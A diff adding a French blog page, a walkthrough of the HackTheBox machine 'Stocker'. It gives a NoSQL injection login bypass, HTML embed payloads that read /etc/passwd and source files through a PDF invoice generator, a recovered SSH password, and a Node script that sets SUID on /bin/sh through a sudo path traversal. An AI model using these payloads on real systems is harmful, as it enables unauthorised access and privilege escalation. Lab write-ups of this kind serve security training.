@@ -1,0 +1,125 @@
+<!doctype html><html lang=en-us><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><title>HackTheBox - Stocker | Vithurshan SELVARAJAH</title><link rel=stylesheet href=/css/style.css><link rel=stylesheet href=/css/fonts.css></head><body><nav><ul class=menu><li><a href=/>Home</a></li><li><a href=/notes/>Notebook</a></li><li><a href=/categories/>Categories</a></li><li><a href=/projects/>Projects</a></li><li><a href=/index.xml>RSS</a></li></ul><hr></nav><div class=article-meta><h1><span class=title>HackTheBox - Stocker</span></h1><h2 class=date>2023/07/01</h2></div><main><h2 id=énumération>Énumération</h2><p>Scanner la machine :</p><pre tabindex=0><code class=language-nil data-lang=nil>sudo nmap -sC -sV -T4 10.10.11.196
+</code></pre><ul><li><code>-sC</code> : Scanner la cible en utilisant les scripts par défaut</li><li><code>-sV</code> : Déterminer la version du service en cours d&rsquo;exécution sur le port.</li></ul><p>Résultat du scan Nmap :</p><pre tabindex=0><code class=language-nil data-lang=nil>Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-13 10:08 CET
+Nmap scan report for 10.10.11.196
+Host is up (0.012s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   3072 3d12971d86bc161683608f4f06e6d54e (RSA)
+|   256 7c4d1a7868ce1200df491037f9ad174f (ECDSA)
+|_  256 dd978050a5bacd7d55e827ed28fdaa3b (ED25519)
+80/tcp open  http    nginx 1.18.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://stocker.htb
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 7.36 seconds
+</code></pre><p>La machine cible héberge un serveur web pour le nom de domaine stocker.htb, ajoutons donc dans /etc/hosts afin de consulter la page web:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>sudo su -c <span style=color:#e6db74>&#34;echo &#39;\n#Hack The Box - Stocker\n10.10.11.196    stocker.htb&#39; &gt;&gt; /etc/hosts&#34;</span>
+</span></span></code></pre></div><p>Maintenant le site web a l&rsquo;url <a href=http:stocker.htb>stocker.htb</a>, pas d&rsquo;info sensible dans le code source du site web. Essayons donc les 3 types d&rsquo;énumération qu&rsquo;on peut effectuer sur un service HTTP.</p><ol><li><p>Énumération de fichiers avec Gobuster :</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>gobuster dir -u http://stocker.htb/ -w $HOME/.local/bin/SecLists/Discovery/Web-Content/raft-medium-files.txt
+</span></span></code></pre></div><ul><li><code>dir</code> : Utiliser le mode d&rsquo;énumération répertoire ou fichier</li><li><code>-u</code> : URL cible</li></ul><p><a href=gobuster_file_enum.png>Resultat de enum de fichiers</a></p></li><li><p>Énumération de dossier avec Gobuster :</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>gobuster dir -u http://stocker.htb/ -w $HOME/.local/bin/SecLists/Discovery/Web-Content/raft-medium-directories.txt
+</span></span></code></pre></div><p><a href=gobuster_dir_enum.png>Resultat de enum de repertoires</a></p></li><li><p>Énumération de sous-domaines avec Gobuster :</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>gobuster vhost -u http://stocker.htb/ -w $HOME/.local/binSecLists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain
+</span></span></code></pre></div><ul><li><code>--append-domain</code> : Ajouter le domaine de l&rsquo;URL aux mots du wordlist. Sinon, FQDN doivent être spécifiés dans le wordlist.</li><li><code>vhost</code> a été utilisé à la place de dns afin d&rsquo;éviter la résolution de nom de domaine car stocker.htb est un nom de domaine que nous avons fait pointé vers l&rsquo;adresse IP de la machine et ce n&rsquo;est pas un vrai nom de domaine.</li></ul><p><a href=gobuster_dns_enum.png>Resultat de enum de sous-domaines</a></p><p>Une page de login est accessible a l&rsquo;adresse <a href=http://dev.stocker.htb>http://dev.stocker.htb</a> dont dirige vers <a href=http://dev.stocker.htb/login>http://dev.stocker.htb/login</a>.</p><p>Ajouter le sous-domaine dans le fichier <code>/etc/hosts</code> :</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>sudo su -c <span style=color:#e6db74>&#34;echo &#39;10.10.11.196    dev.stocker.htb&#39; &gt;&gt; /etc/hosts&#34;</span>
+</span></span></code></pre></div></li></ol><h2 id=login-bypass>Login bypass</h2><p>Utiliser Sqlmap pour trouver des injection SQL en utilisant la requête POST capturé en utilisant Burpsuite :</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>sqlmap -r post_req.txt
+</span></span></code></pre></div><p>Rien d&rsquo;intéressant.</p><p>Essayons maintenant NOSQL injection en modifiant <code>Content-Type</code> et le payload sous format json :</p><pre tabindex=0><code class=language-nil data-lang=nil>POST /login HTTP/1.1
+Host: dev.stocker.htb
+Content-Length: 25
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://dev.stocker.htb
+Content-Type: application/json
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: http://dev.stocker.htb/login
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Cookie: connect.sid=s%3AsH-VNc_skdNFAztIj3l2F8O_1gy18jDb.xUeL%2FX4DV1riM8kVcfj6PZTFohLW2BjHVViIypQnT2o
+Connection: close
+
+{&#34;username&#34;: {&#34;$ne&#34;: null}, &#34;password&#34;: {&#34;$ne&#34;: null} }
+</code></pre><p>Maintenant nous avons bien authentifié et essayons maintenant de commander quelque choses, ares avoir valide nous une facture confirme l&rsquo;achat. Cette facture a été généré dynamiquement, essayons maintenant <strong>template injection</strong>.</p><p>Capturer la phase de validation de la commande avec Burpsuite et modifier le champs dont est utilisé automatiquement pour générer des facture avec diffèrent nom :</p><pre tabindex=0><code class=language-nil data-lang=nil>POST /api/order HTTP/1.1
+Host: dev.stocker.htb
+Content-Length: 163
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36
+Content-Type: application/json
+Accept: */*
+Origin: http://dev.stocker.htb
+Referer: http://dev.stocker.htb/stock
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Cookie: connect.sid=s%3AsH-VNc_skdNFAztIj3l2F8O_1gy18jDb.xUeL%2FX4DV1riM8kVcfj6PZTFohLW2BjHVViIypQnT2o
+Connection: close
+
+{&#34;basket&#34;:[
+{
+&#34;_id&#34;:&#34;638f116eeb060210cbd83a8f&#34;,
+&#34;title&#34;:&#34;Bin&#34;,
+&#34;description&#34;:&#34;It&#39;s a rubbish bin.&#34;,
+&#34;image&#34;:&#34;bin.jpg&#34;,
+&#34;price&#34;:76,
+&#34;currentStock&#34;:15,
+&#34;__v&#34;:0,&#34;amount&#34;:1
+}]}
+</code></pre><p>Remplacer le champ &ldquo;title&rdquo; avec :</p><pre tabindex=0><code class=language-nil data-lang=nil>POST /api/order HTTP/1.1
+Host: dev.stocker.htb
+Content-Length: 163
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36
+Content-Type: application/json
+Accept: */*
+Origin: http://dev.stocker.htb
+Referer: http://dev.stocker.htb/stock
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Cookie: connect.sid=s%3AsH-VNc_skdNFAztIj3l2F8O_1gy18jDb.xUeL%2FX4DV1riM8kVcfj6PZTFohLW2BjHVViIypQnT2o
+Connection: close
+
+{&#34;basket&#34;:[
+{
+&#34;_id&#34;:&#34;638f116eeb060210cbd83a8f&#34;,
+&#34;title&#34;:&#34;&lt;embed type=&#39;text/html&#39; src=&#39;file:///etc/passwd&#39;  width=&#39;300&#39; height=&#39;600&#39;&#34;,
+&#34;description&#34;:&#34;It&#39;s a rubbish bin.&#34;,
+&#34;image&#34;:&#34;bin.jpg&#34;,
+&#34;price&#34;:76,
+&#34;currentStock&#34;:15,
+&#34;__v&#34;:0,&#34;amount&#34;:1
+}]}
+</code></pre><p>Cela nous afficher le contenu de la page passwd sur la facture. En utilisant cette méthode nous pouvons afficher le contenu des fichiers sensible :</p><pre tabindex=0><code class=language-nil data-lang=nil>POST /api/order HTTP/1.1
+Host: dev.stocker.htb
+Content-Length: 163
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36
+Content-Type: application/json
+Accept: */*
+Origin: http://dev.stocker.htb
+Referer: http://dev.stocker.htb/stock
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Cookie: connect.sid=s%3AsH-VNc_skdNFAztIj3l2F8O_1gy18jDb.xUeL%2FX4DV1riM8kVcfj6PZTFohLW2BjHVViIypQnT2o
+Connection: close
+
+{&#34;basket&#34;:[
+{
+&#34;_id&#34;:&#34;638f116eeb060210cbd83a8f&#34;,
+&#34;title&#34;:&#34;&lt;embed type=&#39;text/html&#39; src=&#39;file:///var/www/dev/index.js&#39;  width=&#39;500&#39; height=&#39;700&#39;&#34;,
+&#34;description&#34;:&#34;It&#39;s a rubbish bin.&#34;,
+&#34;image&#34;:&#34;bin.jpg&#34;,
+&#34;price&#34;:76,
+&#34;currentStock&#34;:15,
+&#34;__v&#34;:0,&#34;amount&#34;:1
+}]}
+</code></pre><p>Le fichier index.js contient un mot de passe <strong>IHeardPassphrasesArePrettySecure</strong>, essayons de se connecter au serveur stocker.htb en SSH avec le nom d&rsquo;utilisateur &ldquo;angoose&rdquo; :</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>ssh angoose@stocker.htb
+</span></span></code></pre></div><p>Le flag de l&rsquo;utilisateur se trouve dans <code>/home/angoose/user.txt</code></p><h2 id=privilege-escalation>Privilege escalation</h2><p>Essayons maintenant de trouver un moyen de élevé le privilège, vérifies les privilège sudo d&rsquo;utilisateur angoose en utilisant sudo -l.
+Angoose peut exécuter les script JS qui se trouve dans le dossier /usr/local/scripts/*.js en tant que root. Créerons un script JS afin de assigner un <strong>Setuid</strong> pour pouvoir exécuter en tant que root.</p><p>Essayons de créer un script exploit.js dans le dossier /tmp afin d&rsquo;assigner Setuid :</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#66d9ef>const</span> { <span style=color:#a6e22e>exec</span> } <span style=color:#f92672>=</span> <span style=color:#a6e22e>require</span>(<span style=color:#e6db74>&#39;node:child_process&#39;</span>);
+</span></span><span style=display:flex><span><span style=color:#75715e>// Set SetUID
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#a6e22e>exec</span>(<span style=color:#e6db74>&#39;chmod u+s /bin/sh&#39;</span>, (<span style=color:#a6e22e>err</span>, <span style=color:#a6e22e>output</span>) =&gt; {
+</span></span><span style=display:flex><span>	<span style=color:#75715e>// Check for error
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	<span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>err</span>) {
+</span></span><span style=display:flex><span>		<span style=color:#a6e22e>console</span>.<span style=color:#a6e22e>error</span>(<span style=color:#e6db74>&#39;Unable to setUID&#39;</span>, <span style=color:#a6e22e>err</span>)
+</span></span><span style=display:flex><span>		<span style=color:#66d9ef>return</span>
+</span></span><span style=display:flex><span>	}
+</span></span><span style=display:flex><span>	<span style=color:#75715e>// Message on success
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	<span style=color:#a6e22e>console</span>.<span style=color:#a6e22e>log</span>(<span style=color:#e6db74>&#39;Sucess&#39;</span>, <span style=color:#a6e22e>output</span>)
+</span></span><span style=display:flex><span>})
+</span></span></code></pre></div><p>Exécuter le script depuis dossier /usr/local/scripts car l&rsquo;exécution du script est autoriser uniquement depuis ce dossier :</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>sudo /usr/bin/node /usr/local/scripts/../../../tmp/exploit.js
+</span></span></code></pre></div><p>Maintenant nous pouvons exécuter /bin/sh en tant que root grâce a SetUID, exécuter /bin/sh avec option -p permet de exécuter en tant que root et non angoose :</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>sudo /bin/sh -p
+</span></span></code></pre></div><p>Le flag se trouve dans le ficher <code>/root/root.txt</code>.</p></main><footer><hr>© <a href=https://www.atomicl.net>Vithurshan SELVARAJAH</a> 2022 &ndash; 2023 | <a href=https://github.com/BlackcatRs>Github</a> | <a href=https://www.linkedin.com/in/vithurshan-selvarajah/>LinkedIn</a></footer></body></html>
